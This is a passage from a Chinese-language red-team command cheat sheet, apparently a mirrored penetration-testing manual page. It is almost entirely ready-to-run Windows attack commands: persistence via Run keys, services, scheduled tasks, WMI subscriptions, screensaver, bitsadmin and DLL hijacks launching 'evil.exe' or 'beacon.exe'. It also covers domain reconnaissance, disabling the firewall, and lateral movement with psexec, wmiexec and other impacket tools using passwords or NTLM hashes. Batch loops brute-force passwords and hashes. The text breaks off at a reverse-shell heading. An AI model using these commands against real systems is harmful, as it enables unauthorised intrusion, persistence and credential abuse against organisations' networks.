    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>reg add &#34;XXXX&#34; /v evil /t REG_SZ /d &#34;[Absolute Path]\evil.exe&#34;
1.Load注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

2.Userinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。

3.Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

4.RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

5.RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

6.RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

7.RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

8.Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。</code></pre><h3 id="服务httpsbookshentoushitopmanualredteam_commandhtml服务" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%9c%8d%e5%8a%a1"target="_blank" rel="external nofollow noopener noreferrer">服务</a></span>
  <a href="#%e6%9c%8d%e5%8a%a1httpsbookshentoushitopmanualredteam_commandhtml%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>sc create evil binpath= &#34;cmd.exe /k [Absolute Path]evil.exe&#34; start= &#34;auto&#34; obj= &#34;LocalSystem&#34;</code></pre><h3 id="计划任务httpsbookshentoushitopmanualredteam_commandhtml计划任务" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1"target="_blank" rel="external nofollow noopener noreferrer">计划任务</a></span>
  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1httpsbookshentoushitopmanualredteam_commandhtml%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe</code></pre><h3 id="wmi事件httpsbookshentoushitopmanualredteam_commandhtmlwmi事件" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#wmi%e4%ba%8b%e4%bb%b6"target="_blank" rel="external nofollow noopener noreferrer">WMI事件</a></span>
  <a href="#wmi%e4%ba%8b%e4%bb%b6httpsbookshentoushitopmanualredteam_commandhtmlwmi%e4%ba%8b%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>wmic /NAMESPACE:&#34;\\root\subscription&#34; PATH __EventFilter CREATE Name=&#34;evil&#34;, EventNameSpace=&#34;root\cimv2&#34;,QueryLanguage=&#34;WQL&#34;, Query=&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&#34;

wmic /NAMESPACE:&#34;\\root\subscription&#34; PATH CommandLineEventConsumer CREATE Name=&#34;evilConsumer&#34;, ExecutablePath=&#34;C:\Users\hunter\Desktop\beacon.exe&#34;,CommandLineTemplate=&#34;C:\Users\hunter\Desktop\beacon.exe&#34;

wmic /NAMESPACE:&#34;\\root\subscription&#34; PATH __FilterToConsumerBinding CREATE Filter=&#34;__EventFilter.Name=\&#34;evil\&#34;&#34;, Consumer=&#34;CommandLineEventConsumer.Name=\&#34;evilConsumer\&#34;&#34;</code></pre><h3 id="屏幕保护httpsbookshentoushitopmanualredteam_commandhtml屏幕保护" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4"target="_blank" rel="external nofollow noopener noreferrer">屏幕保护</a></span>
  <a href="#%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4httpsbookshentoushitopmanualredteam_commandhtml%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>reg add &#34;hkcu\control panel\desktop&#34; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaveActive /d 1 /f
reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaverIsSecure /d 0 /f
reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaveTimeOut /d 60 /f</code></pre><h3 id="bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin-1" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bitsadmin-1"target="_blank" rel="external nofollow noopener noreferrer">bitsadmin</a></span>
  <a href="#bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>bitsadmin /create evil
bitsadmin /addfile evil &#34;C:\Users\hunter\Desktop\beacon.exe&#34; &#34;C:\Users\hunter\Desktop\beacon.exe&#34;
bitsadmin.exe /SetNotifyCmdLine evil &#34;C:\Users\hunter\Desktop\beacon.exe&#34; NUL
bitsadmin /Resume evil</code></pre><h3 id="netsh白加黑httpsbookshentoushitopmanualredteam_commandhtmlnetsh白加黑" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#netsh%e7%99%bd%e5%8a%a0%e9%bb%91"target="_blank" rel="external nofollow noopener noreferrer">Netsh白加黑</a></span>
  <a href="#netsh%e7%99%bd%e5%8a%a0%e9%bb%91httpsbookshentoushitopmanualredteam_commandhtmlnetsh%e7%99%bd%e5%8a%a0%e9%bb%91" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>可以通过导入helperdll的方式做权限维持，命令格式如下：
netsh add helper [Absolute evil DLL path]
但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#34; /v Pentestlab /t REG_SZ /d &#34;cmd /c C:\Windows\System32\netsh&#34;
重新启动后依然可获得shell：</code></pre><h3 id="msdtchttpsbookshentoushitopmanualredteam_commandhtmlmsdtc" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#msdtc"target="_blank" rel="external nofollow noopener noreferrer">MSDTC</a></span>
  <a href="#msdtchttpsbookshentoushitopmanualredteam_commandhtmlmsdtc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。 默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：</p>
<pre tabindex="0"><code>sc qc msdtc
sc config msdtc start= auto</code></pre><h2 id="windows信息收集常用命令httpsbookshentoushitopmanualredteam_commandhtmlwindows信息收集常用命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">windows信息收集常用命令</a></span>
  <a href="#windows%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtmlwindows%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>Systeminfo 计算机详细信息(补丁信息)

Net start 所启动的服务

Wmic service list brief 查询本机服务信息

Tasklist 进程列表

Wmic startup get command,caption 查看启动该程序信息

Schtasks /query /fo LIST /v计划任务

Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色

Query user || qwinsta 查看当前在线用户

Net session 列出会话

Net share 查看本机的共享列表

Wmic share get name,path,status 查看共享列表

Net user 本地用户

Net user kkkk 查看本地用户信息


Net localgroup 本地用户组

Net localgroup /domain 域用户组

Net localgroup adminnstrators 本地管理员组成员

net localgroup adminstrators /domain 查看登陆过主机的管理员

Wmic useraccount get /all 获取域内用户详细信息

dsquery user 查看存在的用户

Net user /domain 域用户信息

Net user kkkk /domain 域用户kkkk信息

Net user kent password /add /domain添加域用户


Net group /domain 域用户组信息

Net view /domain 查询域

Net view /domain:test 查询域内计算机

Net accounts /domain 查询域中密码策略

Net group /domain 查看域内所有用户组

Net group &#34;Domain Controllers&#34; /domain 查看域控制器组

Net group &#34;Domain computers&#34; /domain 查看域内所有计算机列表

Net group &#34;Domain admins&#34; /domain 查看域内管理员用户

Net user /domain kent active:yes 启用域账户

Net user /domain kent active:no 禁用域账户

Nltest /DCLIST:test 查看域中域控制器名

Wmic useraccount get /all 用户详细信息

Net group &#34;Domain Admins&#34; /domain 对应组下的账户信息

nltest /domain_trusts 获取域信任信息

net config workstation 了解本机的配置信息

Netsh firewall show config 查看防火墙配置

Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)

Netsh advfirewall firewall add rule name=&#34;pass nc&#34; dir=in action=allow program=&#34;C:\nc.exe&#34; 允许指定程序进入(windows server 2003后)

Netsh advfirewall firewall add rule name=&#34;allow nc&#34; dir=out action=allow program=&#34;C:\nc.exe&#34;允许指定程序退出(windows server 2003后)

Netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)

Reg query &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;查看端口代理配置信息

Reg query &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /V PortNumber 查看远程桌面端口号</code></pre><h2 id="atschtaskssc横向httpsbookshentoushitopmanualredteam_commandhtmlatschtaskssc横向" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#atschtaskssc%e6%a8%aa%e5%90%91"target="_blank" rel="external nofollow noopener noreferrer">at&amp;schtasks&amp;sc横向</a></span>
  <a href="#atschtaskssc%e6%a8%aa%e5%90%91httpsbookshentoushitopmanualredteam_commandhtmlatschtaskssc%e6%a8%aa%e5%90%91" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>使用明文密码登录到目标，需要445和139端口开启：</p>
<pre tabindex="0"><code>net use \\192.168.2.148\ipc$ password /user:test\administrator

net use \\192.168.2.148\ipc$ password /user:administrator

复制文件
copy c:\1.exe \\192.168.2.148\c$

at新建10:10分运行的定时作业
at \\192.168.2.148 10:10 c:\1.exe

Windows server 2012及以上使用schtasks命令
Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
Schtasks /run /s 192.168.2.148 /tn executefile /i
Schtasks /delete /s 192.168.2.148 /tn executefile /f

sc \\192.168.210.107 create hacker binpath=&#34;c:\shell1.exe&#34;   #创建服务
sc \\192.168.210.107 start hacker      #启动hacker服务</code></pre><h2 id="impacket包横向命令httpsbookshentoushitopmanualredteam_commandhtmlimpacket包横向命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#impacket%e5%8c%85%e6%a8%aa%e5%90%91%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">impacket包横向命令</a></span>
  <a href="#impacket%e5%8c%85%e6%a8%aa%e5%90%91%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtmlimpacket%e5%8c%85%e6%a8%aa%e5%90%91%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>下载https://github.com/maaaaz/impacket-examples-windows
<a href="https://github.com/ropnop/impacket_static_binaries/releases"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/ropnop/impacket_static_binaries/releases</a>
Atexec</p>
<pre tabindex="0"><code>需要445端口开启
Atexec.exe hacker/administrator:abc123@192.168.202.148 &#34;whoami&#34;

Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &#34;whoami&#34;</code></pre><p>dcomexec</p>
<pre tabindex="0"><code>需要135端口开启
dcomexec.exe hacker/administrator:abc123@192.168.202.148 &#34;whoami&#34;

dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &#34;whoami&#34;</code></pre><p>psexec</p>
<pre tabindex="0"><code>官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
Psexec \192.168.202.148 -accepteula -s cmd

官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd

PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 &#34;whoami&#34; (官方提供的exe执行不了)</code></pre><p>smbexec</p>
<pre tabindex="0"><code>需要445端口开启
Smbexec test/Administrator:zxcvbnm123@192.168.202.148
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148</code></pre><p>wmi</p>
<pre tabindex="0"><code>WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create &#34;cmd.exe /c ipconfig &gt;C:/1.txt&#34;

第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123

第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 &#34;whoami&#34;
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 &#34;whoami&#34;</code></pre><p>批量操作,需要保存为bat执行</p>
<pre tabindex="0"><code>用已知密码和用户，批量连接ip:
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator

已知用户和ip，批量连接密码(爆破密码)：
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ &#34;%%i&#34; /user:test\administrator

已知用户和ip，批量连接hash(爆破hash)：
FOR /F %%i in (hash.txt) do atexec.exe -hashes :&#34;%%i&#34; test/administrator@192.168.202.148 &#34;whoami&#34;</code></pre><p>精准批量法</p>
<pre tabindex="0"><code>shell for /l %i in (1,1,253) do echo 172.22.13.%i &gt;&gt;tip.txt
shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i &#34;ttl&#34; &gt;nul &amp;&amp; echo %%i &gt;&gt;ok.tx
shell for /f %i in (ok.txt) do dir \\%i\c$\users &gt;&gt;result.txt</code></pre><p>cme 批量</p>
<pre tabindex="0"><code>proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x &#34;net user&#34;</code></pre><p>单独执行命令</p>
<pre tabindex="0"><code>crackmapexec smb 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -x whoami</code></pre><p>ldap喷洒</p>
<pre tabindex="0"><code>cme ldap 10.11.12.211 -u &#39;username&#39; -p &#39;password&#39; --kdcHost 10.11.12.211 --users</code></pre><h2 id="反弹shellhttpsbookshentoushitopmanualredteam_commandhtml反弹shell" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%8f%8d%e5%bc%b9shell"target="_blank" rel="external nofollow noopener noreferrer">反弹shell</a></span>
  <a href="#%e5%8f%8d%e5%bc%b9shellhttpsbookshentoushitopmanualredteam_commandhtml%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 id="nchttpsbookshentoushitopmanualredteam_commandhtmlnc" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nc"target="_blank" rel="external nofollow noopener noreferrer">nc</a></span>
  <a href="#nchttpsbookshentoushitopmanualredteam_commandhtmlnc" class="heading-mark">
